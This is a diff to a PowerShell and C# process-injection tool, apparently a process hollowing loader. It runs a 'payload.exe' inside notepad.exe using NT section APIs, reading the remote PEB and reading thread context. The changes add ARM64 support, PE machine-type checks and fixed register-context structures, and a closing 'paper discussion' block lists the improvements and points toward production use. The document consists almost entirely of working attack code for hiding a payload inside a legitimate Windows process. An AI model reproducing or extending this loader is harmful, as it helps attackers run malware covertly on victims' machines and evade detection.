@@ -49,33 +49,51 @@ public struct CONTEXT64 {
     public ulong R15;
     public ulong Rip;
     
-    // XMM registers - 16 registros de 16 bytes = 256 bytes
-    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
-    public byte[] FltSave; // XMM_SAVE_AREA32
-    
-    public ulong VectorRegister0;
-    public ulong VectorRegister1;
-    public ulong VectorRegister2;
-    public ulong VectorRegister3;
-    public ulong VectorRegister4;
-    public ulong VectorRegister5;
-    public ulong VectorRegister6;
-    public ulong VectorRegister7;
-    public ulong VectorRegister8;
-    public ulong VectorRegister9;
-    public ulong VectorRegister10;
-    public ulong VectorRegister11;
-    public ulong VectorRegister12;
-    public ulong VectorRegister13;
-    public ulong VectorRegister14;
-    public ulong VectorRegister15;
-    
+    // XSAVE_FORMAT (XMM_SAVE_AREA32) = 512 bytes
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+    public byte[] FltSave;
+
+    // M128A VectorRegister[26] = 26 * 16 = 416 bytes
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 416)]
+    public byte[] VectorRegister;
+
     public ulong VectorControl;
     public ulong DebugControl;
     public ulong LastBranchToRip;
     public ulong LastBranchFromRip;
     public ulong LastExceptionToRip;
     public ulong LastExceptionFromRip;
+}
+
+// ARM64 CONTEXT for Windows on ARM (based on winnt.h ARM64_NT_CONTEXT)
+[StructLayout(LayoutKind.Sequential)]
+public struct CONTEXT_ARM64 {
+    public uint ContextFlags;
+    public uint Cpsr;
+
+    // General purpose registers X0-X28, Fp (X29), Lr (X30)
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 31)]
+    public ulong[] X;
+
+    public ulong Sp;
+    public ulong Pc;
+
+    // NEON/FP registers V[32], each 128-bit = 32 * 16 = 512 bytes
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+    public byte[] V;
+
+    public uint Fpcr;
+    public uint Fpsr;
+
+    // Debug registers
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+    public uint[] Bcr;   // ARM64_MAX_BREAKPOINTS = 8
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+    public ulong[] Bvr;
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+    public uint[] Wcr;   // ARM64_MAX_WATCHPOINTS = 2
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+    public ulong[] Wvr;
 }
 
 [StructLayout(LayoutKind.Sequential)]
@@ -107,6 +125,14 @@ public struct PROCESS_BASIC_INFORMATION {
 }
 
 public static class NtNative {
+    // Architecture constants
+    public const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
+    public const ushort IMAGE_FILE_MACHINE_ARM64 = 0xAA64;
+
+    // Context flags
+    public const uint CONTEXT_AMD64_INTEGER = 0x100002;
+    public const uint CONTEXT_ARM64_INTEGER = 0x00400002;
+
     // Constantes
     public const uint PAGE_READWRITE = 0x04;
     public const uint PAGE_EXECUTE_READ = 0x20;
@@ -177,10 +203,16 @@ public static class NtNative {
     [DllImport("kernel32.dll")]
     public static extern uint ResumeThread(IntPtr hThread);
     
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool GetThreadContext(
+    [DllImport("kernel32.dll", SetLastError=true, EntryPoint="GetThreadContext")]
+    public static extern bool GetThreadContext64(
         IntPtr hThread,
         ref CONTEXT64 lpContext
+    );
+
+    [DllImport("kernel32.dll", SetLastError=true, EntryPoint="GetThreadContext")]
+    public static extern bool GetThreadContextArm64(
+        IntPtr hThread,
+        ref CONTEXT_ARM64 lpContext
     );
     
     [DllImport("ntdll.dll")]
@@ -255,7 +287,7 @@ function New-UnicodeString {
     [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $buffer, $bytes.Length)
     [System.Runtime.InteropServices.Marshal]::WriteInt16($buffer, $bytes.Length, 0)  # Null terminator
     
-    $unicodeString = New-Object NtNative+UNICODE_STRING
+    $unicodeString = New-Object UNICODE_STRING
     $unicodeString.Length = $bytes.Length
     $unicodeString.MaximumLength = $bytes.Length + 2
     $unicodeString.Buffer = $buffer
@@ -265,11 +297,11 @@ function New-UnicodeString {
 
 function New-ObjectAttributes {
     param(
-        [NtNative+UNICODE_STRING]$ObjectName,
+        [UNICODE_STRING]$ObjectName,
         [uint]$Attributes = 0
     )
     
-    $oa = New-Object NtNative+OBJECT_ATTRIBUTES
+    $oa = New-Object OBJECT_ATTRIBUTES
     $oa.Length = [uint][System.Runtime.InteropServices.Marshal]::SizeOf($oa)
     $oa.RootDirectory = [IntPtr]::Zero
     $oa.ObjectName = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ObjectName))
@@ -289,7 +321,7 @@ function Get-RemoteImageBase {
     
     try {
         # Intentar obtener del PEB (método robusto)
-        $pbi = New-Object NtNative+PROCESS_BASIC_INFORMATION
+        $pbi = New-Object PROCESS_BASIC_INFORMATION
         $returnLength = 0
         
         $status = [NtNative]::NtQueryInformationProcess(
@@ -301,7 +333,7 @@ function Get-RemoteImageBase {
         )
         
         if ($status -eq 0 -and $pbi.PebBaseAddress -ne [IntPtr]::Zero) {
-            # Leer el PEB (offset 0x10 para ImageBaseAddress en x64)
+            # PEB offset 0x10 = ImageBaseAddress (same on x64 and ARM64, both 64-bit)
             $buffer = New-Object byte[] 8
             $bytesRead = [IntPtr]::Zero
             
@@ -322,22 +354,55 @@ function Get-RemoteImageBase {
         Write-Host "[!] Exception in PEB method: $_"
     }
     
-    # Fallback: usar contexto
+    # Fallback: usar contexto (architecture-aware)
     Write-Host "[!] Using context fallback for ImageBase"
-    $ctx = New-Object CONTEXT64
-    $ctx.FltSave = New-Object byte[] 256
-    $ctx.ContextFlags = 0x100010  # CONTEXT_INTEGER
-    
-    if (-not [NtNative]::GetThreadContext($hThread, [ref]$ctx)) {
-        $lastError = [NtNative]::GetLastError()
-        throw "GetThreadContext failed: 0x$("{0:X}" -f $lastError)"
+
+    if ($script:isArm64) {
+        $ctx = New-Object CONTEXT_ARM64
+        $ctx.X = New-Object ulong[] 31
+        $ctx.V = New-Object byte[] 512
+        $ctx.Bcr = New-Object uint[] 8
+        $ctx.Bvr = New-Object ulong[] 8
+        $ctx.Wcr = New-Object uint[] 2
+        $ctx.Wvr = New-Object ulong[] 2
+        $ctx.ContextFlags = [NtNative]::CONTEXT_ARM64_INTEGER
+
+        if (-not [NtNative]::GetThreadContextArm64($hThread, [ref]$ctx)) {
+            $lastError = [NtNative]::GetLastError()
+            throw "GetThreadContext (ARM64) failed: 0x$("{0:X}" -f $lastError)"
+        }
+
+        # On ARM64, X1 holds the PEB pointer for the initial thread (analogous to Rdx on x64)
+        Write-Host "[*] ImageBase from context.X[1]: 0x$("{0:X}" -f $ctx.X[1])"
+        return [IntPtr]::new([Int64]$ctx.X[1])
     }
-    
-    Write-Host "[*] ImageBase from context.Rdx: 0x$("{0:X}" -f $ctx.Rdx)"
-    return [IntPtr]::new([Int64]$ctx.Rdx)
+    else {
+        $ctx = New-Object CONTEXT64
+        $ctx.FltSave = New-Object byte[] 512
+        $ctx.VectorRegister = New-Object byte[] 416
+        $ctx.ContextFlags = [NtNative]::CONTEXT_AMD64_INTEGER
+
+        if (-not [NtNative]::GetThreadContext64($hThread, [ref]$ctx)) {
+            $lastError = [NtNative]::GetLastError()
+            throw "GetThreadContext (x64) failed: 0x$("{0:X}" -f $lastError)"
+        }
+
+        Write-Host "[*] ImageBase from context.Rdx: 0x$("{0:X}" -f $ctx.Rdx)"
+        return [IntPtr]::new([Int64]$ctx.Rdx)
+    }
 }
 
 # 3. TERCERO: Código principal
+# Detect host architecture
+$script:isArm64 = [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture -eq [System.Runtime.InteropServices.Architecture]::Arm64
+if ($script:isArm64) {
+    Write-Host "[*] Host architecture: ARM64"
+    $expectedMachine = [NtNative]::IMAGE_FILE_MACHINE_ARM64
+} else {
+    Write-Host "[*] Host architecture: x64 (AMD64)"
+    $expectedMachine = [NtNative]::IMAGE_FILE_MACHINE_AMD64
+}
+
 # CONFIG
 $payloadPath = "payload.exe"
 $targetBinary = "C:\Windows\System32\notepad.exe"
@@ -360,17 +425,24 @@ try {
         throw "Invalid e_lfanew value"
     }
     
+    # Validate Machine type from COFF header (offset +4 from PE signature)
+    $machineType = [BitConverter]::ToUInt16($payload, $e_lfanew + 4)
+    if ($machineType -ne $expectedMachine) {
+        $machineHex = "0x{0:X4}" -f $machineType
+        $expectedHex = "0x{0:X4}" -f $expectedMachine
+        throw "Payload Machine type mismatch: got $machineHex, expected $expectedHex for current architecture"
+    }
+    Write-Host "[*] PE Machine type: 0x$("{0:X4}" -f $machineType)"
+
     $optionalHeaderOffset = $e_lfanew + 0x18
     $is64Bit = [BitConverter]::ToUInt16($payload, $optionalHeaderOffset + 0x0) -eq 0x20B
-    
-    # Solo para 64-bit
+
     if (-not $is64Bit) {
-        throw "Only 64-bit payloads are supported"
+        throw "Only 64-bit (PE32+) payloads are supported"
     }
-    
+
     $imageBase = [BitConverter]::ToUInt64($payload, $optionalHeaderOffset + 0x18)
-    $entryOffset = $optionalHeaderOffset + 0x20
-    $entryPointRVA = [BitConverter]::ToUInt32($payload, $entryOffset)
+    $entryPointRVA = [BitConverter]::ToUInt32($payload, $optionalHeaderOffset + 0x10)
     
     Write-Host "[*] Payload ImageBase: 0x$("{0:X}" -f $imageBase)"
     Write-Host "[*] EntryPoint RVA: 0x$("{0:X}" -f $entryPointRVA)"
@@ -520,10 +592,11 @@ catch {
 Write-Host "[!] Done! Check your payload execution."
 Write-Host ""
 Write-Host "=== FOR PAPER DISCUSSION ==="
-Write-Host "1. CONTEXT64 structure properly defined with correct ABI"
-Write-Host "2. OBJECT_ATTRIBUTES with correct ULONG Length"
-Write-Host "3. PROCESS_BASIC_INFORMATION correct for ProcessBasicInformation"
-Write-Host "4. Section created with proper UNICODE_STRING"
-Write-Host "5. ImageBase obtained via PEB (robust) with context fallback"
-Write-Host "6. Limitation: EntryPoint jump assumes position-independent payload"
+Write-Host "1. CONTEXT64 and CONTEXT_ARM64 structures with correct ABI layout"
+Write-Host "2. Runtime architecture detection (x64/ARM64) with matching PE Machine validation"
+Write-Host "3. OBJECT_ATTRIBUTES with correct ULONG Length"
+Write-Host "4. PROCESS_BASIC_INFORMATION correct for ProcessBasicInformation"
+Write-Host "5. Section created with proper UNICODE_STRING"
+Write-Host "6. ImageBase obtained via PEB (robust) with arch-aware context fallback"
+Write-Host "7. Limitation: EntryPoint jump assumes position-independent payload"
 Write-Host "   (For production: implement PE loader or use shellcode stub)"
